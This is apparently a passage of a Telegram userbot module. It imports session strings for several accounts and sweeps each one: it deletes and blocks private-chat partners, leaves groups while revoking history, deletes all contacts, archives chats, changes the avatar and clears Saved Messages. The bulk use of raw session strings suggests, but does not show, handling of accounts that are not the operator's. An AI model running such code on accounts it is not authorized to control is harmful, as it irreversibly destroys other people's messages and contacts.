                except AccountFloodError:
                    raise
                except Exception as e:
                    s9e.append(f"DelH {uid}: {e}")
                try:
                    await self._sr(client, BlockRequest(id=ent), f"Blk_{uid}", an)
                    blocked.append(f"{get_full_name(ent)} ({uid})")
                except AccountFloodError:
                    raise
                except Exception as e:
                    s9e.append(f"Blk {uid}: {e}")
                await asyncio.sleep(0.5)
        except AccountFloodError:
            raise
        except Exception as e:
            s9e.append(f"PM: {e}")
        sm.append(f"PMs:{len(deleted)} Blk:{len(blocked)}")
        dt.append(f"\n--- PMs({len(deleted)}) Blocked({len(blocked)}) ---")
        for x in deleted:
            dt.append(f"  Del: {x}")
        for x in blocked:
            dt.append(f"  Blk: {x}")
        for e in s9e:
            dt.append(f"  ERR: {e}")

        # Step 10: Leave non-folder chats
        left, s10e = [], []
        try:
            _, afs = await self._get_filters(client, an)
            inf = self._chats_in_folders(afs)
            await self._ec(client)
            for d in await client.get_dialogs():
                ent = d.entity
                if isinstance(ent, (ChannelForbidden, ChatForbidden, User)):
                    continue
                eid = ent.id
                if eid in inf:
                    continue
                try:
                    if isinstance(ent, Channel):
                        try:
                            await self._sr(client, LeaveChannelRequest(channel=ent),
                                           f"Leave_{eid}", an)
                            left.append(f"{ent.title} ({eid})")
                        except UserCreatorError:
                            pass
                        except ChannelPrivateError:
                            left.append(f"{ent.title} ({eid},priv)")
                    elif isinstance(ent, Chat):
                        try:
                            await self._ec(client)
                            await self._sr(client, DeleteChatUserRequest(
                                chat_id=ent.id,
                                user_id=await client.get_input_entity(me.id),
                                revoke_history=True,
                            ), f"LeaveChat_{eid}", an)
                            left.append(f"{ent.title} ({eid})")
                        except (UserCreatorError, ChatIdInvalidError):
                            pass
                except AccountFloodError:
                    raise
                except Exception as e:
                    s10e.append(f"Leave {eid}: {e}")
                await asyncio.sleep(0.5)
        except AccountFloodError:
            raise
        except Exception as e:
            s10e.append(f"Leave: {e}")
        sm.append(f"Left:{len(left)}")
        dt.append(f"\n--- Left({len(left)}) ---")
        for x in left:
            dt.append(f"  {x}")
        for e in s10e:
            dt.append(f"  ERR: {e}")

        # Step 11: Contacts
        dc, s11e = [], []
        try:
            cr = await self._sr(client, GetContactsRequest(hash=0), "GetContacts", an)
            if hasattr(cr, "users") and cr.users:
                try:
                    await self._sr(client, DeleteContactsRequest(id=cr.users), "DelContacts", an)
                    dc = [f"{get_full_name(u)} ({u.id})" for u in cr.users]
                except AccountFloodError:
                    raise
                except Exception:
                    for u in cr.users:
                        try:
                            await self._sr(client, DeleteContactsRequest(id=[u]),
                                           f"DelC_{u.id}", an)
                            dc.append(f"{get_full_name(u)} ({u.id})")
                        except AccountFloodError:
                            raise
                        except Exception as e2:
                            s11e.append(f"C {u.id}: {e2}")
                        await asyncio.sleep(0.2)
        except AccountFloodError:
            raise
        except Exception as e:
            s11e.append(f"Contacts: {e}")
        sm.append(f"Contacts:{len(dc)}")
        dt.append(f"\n--- Contacts({len(dc)}) ---")
        for x in dc:
            dt.append(f"  {x}")

        # Step 12: Archive non-excluded (with mute check)
        arch, ask, aerr = await self._archive_non_excluded(client, excl, an)
        sm.append(f"Archived:{len(arch)} skip:{ask}")
        dt.append(f"\n--- Archived({len(arch)}) skip({ask}) ---")
        for x in arch:
            dt.append(f"  {x}")
        for e in aerr:
            dt.append(f"  ERR: {e}")

        # Step 13: Pin & order
        perr = await self._pin_and_order(client, me.id, oid, sbid, an)
        sm.append(f"Pin: {'OK' if not perr else 'Partial'}")
        dt.append("\n--- Pin ---")
        for e in perr:
            dt.append(f"  ERR: {e}")

        # Step 14: Avatar
        aurl = self.config["avatar_url"]
        if aurl:
            ok, err = await self._set_avatar(client, aurl, an)
            sm.append(f"Ava: {'OK' if ok else 'ERR'}")
            dt.append(f"\n--- Ava: {'OK' if ok else err} ---")

        # Step 15: Final — remove Saved from ALL folders again + clear
        await asyncio.sleep(0.5)
        ok2, rem2 = await self._remove_saved_from_all_folders(client, me.id, an)
        sm.append(f"FinalRemSaved: {len(rem2)}")
        dt.append(f"\n--- FinalRemSaved: {len(rem2)} ---")
        for r in rem2:
            dt.append(f"  {r}")

        cerr2 = await self._clear_saved(client, an)
        sm.append(f"FinalClear: {'OK' if not cerr2 else 'Partial'}")
        dt.append("\n--- FinalClear ---")
        for e in cerr2:
            dt.append(f"  {e}")

        return sm, dt

    @loader.command(ru_doc="Управление", en_doc="Manage")
    async def manage(self, message: Message):
        args = utils.get_args_raw(message)
        al = args.split() if args else []
        if not al:
            return await utils.answer(message, self.strings["help"])
        cmd = al[0].lower()
        h = {"add": self._cmd_add, "list": self._cmd_list,
             "remove": self._cmd_remove, "folder": self._cmd_folder,
             "ava": self._cmd_ava, "set": self._cmd_set, "start": self._cmd_start}
        handler = h.get(cmd)
        if not handler:
            return await utils.answer(message, self.strings["help"])
        if cmd in ("add", "remove", "folder", "ava", "set"):
            await handler(message, al)
        else:
            await handler(message)

    async def _cmd_add(self, message, args):
        aid, _ = self._get_api()
        if not aid:
            return await utils.answer(message, self.strings["error_no_api"])
        if len(self._sessions_runtime) >= MAX_SESSIONS:
            return await utils.answer(message, self.strings["session_max"].format(max=MAX_SESSIONS))
        persistent, ss = False, None
        if len(args) > 1 and args[1].lower() == "long":
            persistent = True
            if len(args) > 2:
                ss = self._find_ss(" ".join(args[2:]))
        elif len(args) > 1:
            ss = self._find_ss(" ".join(args[1:]))
        if not ss:
            reply = await message.get_reply_message()
            if reply and reply.text:
                ss = self._find_ss(reply.text)
        if not ss:
            return await utils.answer(message, self.strings["provide_session"])
        if any(s["session"] == ss for s in self._sessions_runtime):
            return await utils.answer(message, self.strings["session_exists"])
        c, r = await self._connect_session(ss)
        if c is None:
            return await utils.answer(message,
                f"{self.strings['session_not_authorized']}\n{self.strings['line']}\n{r}")
        me = r
        if any(s["user_id"] == me.id for s in self._sessions_runtime):
            await c.disconnect()
            return await utils.answer(message, self.strings["session_exists"])
        ph = getattr(me, "phone", "Unknown") or "Hidden"
        self._sessions_runtime.append({
            "session": ss, "user_id": me.id, "name": get_full_name(me),
            "phone": ph, "persistent": persistent,
        })
        self._clients.append(c)
        self._save_sessions()
        try:
            await message.delete()
        except Exception:
            pass
        tid = None
        rt = getattr(message, "reply_to", None)
        if rt:
            tid = getattr(rt, "reply_to_top_id", None) or getattr(rt, "reply_to_msg_id", None)
        await self._client.send_message(message.chat_id, self.strings["session_added"].format(
            line=self.strings["line"], name=get_full_name(me), user_id=me.id,
            phone=ph, persistent="Yes" if persistent else "No",
            slot=len(self._sessions_runtime), max=MAX_SESSIONS,
        ), reply_to=tid, parse_mode="html")

    async def _cmd_list(self, message):
        if not self._sessions_runtime:
            return await utils.answer(message, self.strings["no_sessions"])
        lines = [
            f"{i}. {s['name']} | <code>{s['user_id']}</code> | <code>{s['phone']}</code>"
            f"{' [long]' if s.get('persistent') else ''}"
            for i, s in enumerate(self._sessions_runtime, 1)
        ]
        await utils.answer(message, self.strings["session_list"].format(
            count=len(self._sessions_runtime), max=MAX_SESSIONS,
            line=self.strings["line"], sessions="\n".join(lines),
        ))

    async def _cmd_remove(self, message, args):
        if not self._sessions_runtime:
            return await utils.answer(message, self.strings["no_sessions"])
        if len(args) < 2:
            return await utils.answer(message, self.strings["session_remove_invalid"])
        try:
            n = int(args[1])
            assert 1 <= n <= len(self._sessions_runtime)
        except (ValueError, AssertionError):
            return await utils.answer(message, self.strings["session_remove_invalid"])
        idx = n - 1
        try:
            await self._clients[idx].disconnect()
        except Exception:
            pass
        self._sessions_runtime.pop(idx)
        self._clients.pop(idx)
        self._save_sessions()
        await utils.answer(message, self.strings["session_removed"].format(num=n))

    async def _cmd_folder(self, message, args):
        if len(args) < 2:
            return await utils.answer(message, self.strings["folder_provide"])
        try:
            fn = int(args[1])
            assert fn in (1, 2, 3)
        except (ValueError, AssertionError):
            return await utils.answer(message, self.strings["folder_invalid_num"])
        key = f"folder_link_{fn}"
        if len(args) < 3:
            if self.config[key]:
                self.config[key] = ""
                return await utils.answer(message, self.strings["folder_cleared"].format(num=fn))
            return await utils.answer(message, self.strings["folder_provide"])
        self.config[key] = args[2]
        await utils.answer(message, self.strings["folder_set"].format(num=fn, link=args[2]))

    async def _cmd_ava(self, message, args):
        if len(args) < 2:
            if self.config["avatar_url"]:
                self.config["avatar_url"] = ""
                return await utils.answer(message, self.strings["ava_cleared"])
            return await utils.answer(message, self.strings["ava_provide"])
        self.config["avatar_url"] = args[1]
        await utils.answer(message, self.strings["ava_set"].format(url=args[1]))

    async def _cmd_set(self, message, args):
        if len(args) < 2:
            return await utils.answer(message, self.strings["timezone_invalid"])
        try:
            o = int(args[1].replace("+", ""))
            assert -12 <= o <= 12
            self.config["timezone_offset"] = o
            await utils.answer(message, self.strings["timezone_set"].format(
                timezone_str=self._tz_label(o)))
        except (ValueError, AssertionError):
            await utils.answer(message, self.strings["timezone_invalid"])

    async def _cmd_start(self, message):
        aid, _ = self._get_api()
        if not aid:
            return await utils.answer(message, self.strings["error_no_api"])
        if not self._sessions_runtime or not self._clients:
            return await utils.answer(message, self.strings["error_no_sessions"])
        if self._processing_lock.locked():
            return await utils.answer(message, self.strings["already_processing"])

        async with self._processing_lock:
            self._current_message = message
            status = await utils.answer(message, self.strings["processing"])
            self._status_msg = status[0] if isinstance(status, list) else status
            self._flood_until.clear()
            self._flood_log.clear()

            pending = {}
            for i, (sd, cl) in enumerate(zip(self._sessions_runtime, self._clients)):
                pending[i] = {"sd": sd, "cl": cl, "sm": [], "dt": [], "done": False}

            while True:
                ran, all_fl = False, True
                for i, info in pending.items():
                    if info["done"] or self._is_flooded(info["cl"]):
                        continue
                    all_fl = False
                    ran = True
                    an = info["sd"]["name"]
                    try:
                        await self._ec(info["cl"])
                        me = await info["cl"].get_me()
                        name = get_full_name(me)
                        s, d = await self._process_account(info["cl"], me, name)
                        info["sm"] = [f"\n=== [{i+1}] {name} ({me.id}) ==="] + s
                        info["dt"] = [f"\n{'='*50}"] + d
                        info["done"] = True
                    except AccountFloodError as fe:
                        logger.info(f"[MANAGER] [{i+1}] {an} flood {fe.method}")
                        await self._update_flood_status()
                    except Exception as e:
                        info["sm"] = [f"\n=== [{i+1}] {an} ===", f"FATAL: {e}"]
                        info["dt"] = info["sm"][:]
                        info["done"] = True

                if all(x["done"] for x in pending.values()):
                    break
                nd = [i for i, x in pending.items() if not x["done"]]
                if not nd:
                    break
                if not ran or all_fl:
                    fts = [self._flood_rem(pending[i]["cl"]) for i in nd]
                    fts = [t for t in fts if t > 0]
                    if fts:
                        wt = min(fts)
                        if self._status_msg:
                            try:
                                await utils.answer(self._status_msg,
                                    self.strings["processing_flood"].format(
                                        resume_time=self._time_str(time.time() + wt)))
                            except Exception:
                                pass
                        await asyncio.sleep(wt)
                        if self._status_msg:
                            try:
                                await utils.answer(self._status_msg, self.strings["processing"])
                            except Exception:
                                pass
                    else:
                        await asyncio.sleep(1)

            a_sm, a_dt = [], []
            for i in sorted(pending):
                a_sm.extend(pending[i]["sm"])
                a_dt.extend(pending[i]["dt"])

            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            cnt = len(self._sessions_runtime)
            sep = "=" * 50

            tid = None
            rt = getattr(message, "reply_to", None)
            if rt:
                tid = getattr(rt, "reply_to_top_id", None) or getattr(rt, "reply_to_msg_id", None)

            try:
                await utils.answer(self._status_msg, self.strings["success"])
            except Exception:
                pass
            self._status_msg = None

            for name, lines in (("summary", a_sm), ("detailed", a_dt)):
                txt = f"MANAGER - {name.upper()}\nDate: {ts}\nAccounts: {cnt}\n{sep}\n" + "\n".join(lines)
                f = io.BytesIO(txt.encode("utf-8"))
                f.name = f"{name}.txt"
                await self._client.send_file(message.chat_id, f,
                    caption=f"<b>{name.title()}</b>", reply_to=tid, parse_mode="html")

            if self._flood_log:
                ft = f"MANAGER - FLOOD LOG\nDate: {ts}\n{sep}\n"
                for e in self._flood_log:
                    ft += (f"\nAccount: {e['account']}\nMethod: {e['method']}\n"
                           f"Flood: {e['flood_seconds']}s+{e['extra_wait']}s\n"
                           f"Time: {e['timestamp']}\nResume: {e['resume_at']}\n{'-'*30}\n")
                ff = io.BytesIO(ft.encode("utf-8"))
                ff.name = "flood_log.txt"
                await self._client.send_file(message.chat_id, ff,
                    caption="<b>Flood Log</b>", reply_to=tid, parse_mode="html")

            to_rm = []
            for i in range(len(self._sessions_runtime) - 1, -1, -1):
                if not self._sessions_runtime[i].get("persistent", False):
                    try:
                        await self._clients[i].disconnect()
                    except Exception:
                        pass
                    to_rm.append(i)
            for i in to_rm:
                self._sessions_runtime.pop(i)
                self._clients.pop(i)
            self._save_sessions()
            self._flood_until.clear()
            self._current_message = None